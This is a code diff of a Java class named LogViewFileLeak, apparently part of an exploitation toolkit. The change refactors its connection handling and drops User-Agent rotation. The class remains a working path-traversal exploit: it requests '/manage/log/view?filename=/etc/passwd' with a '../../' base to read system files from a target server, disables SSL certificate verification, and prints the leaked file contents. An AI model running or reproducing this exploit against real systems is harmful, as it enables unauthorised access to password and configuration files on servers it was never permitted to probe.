@@ -1,15 +1,13 @@
 package src.main.module;
 
-import src.main.common.UA_Config;
+import src.main.common.HTTPConfig;
 import src.main.impl.ResultCallback;
 
 import java.io.BufferedReader;
 import java.io.InputStreamReader;
 import java.net.HttpURLConnection;
-import java.net.URL;
-import java.util.List;
 
-import static src.main.SSLVerify.sslVer.disableSSLVerification;
+import static src.main.ssl.sslVer.disableSSLVerification;
 
 public class LogViewFileLeak {
     private String address;
@@ -21,7 +19,6 @@ public class LogViewFileLeak {
     }
 
     public void Exp(ResultCallback callback){
-        String ua = "";
         String base = "../../../../../../../../";
         String[] apis = {
                 "/manage/log/view?filename=/etc/passwd&base=" + base,
@@ -31,15 +28,10 @@ public class LogViewFileLeak {
         };
         disableSSLVerification();
         try{
-            UA_Config uacf = new UA_Config();
-            List<String> ualist = uacf.loadUserAgents();
-            ua = uacf.getRandomUserAgent(ualist);
             for (String api : apis) {
                 try {
-                    URL obj = new URL(address + api);
-                    HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
+                    HttpURLConnection conn = HTTPConfig.createConnection(address + api);
                     conn.setRequestMethod("GET");
-                    conn.setRequestProperty("User-Agent",ua);
                     // 配置连接和发送请求
                     int responseCode = conn.getResponseCode();
                     BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
@@ -54,7 +46,7 @@ public class LogViewFileLeak {
                         callback.onResult(text);
                         text = "地址为: " + address + api;
                         callback.onResult(text);
-                        text = "文件内容为: " + "\n" + response.toString();
+                        text = "文件内容为: " + "\n" + response;
                         callback.onResult(text);
                         break;
                     }else{
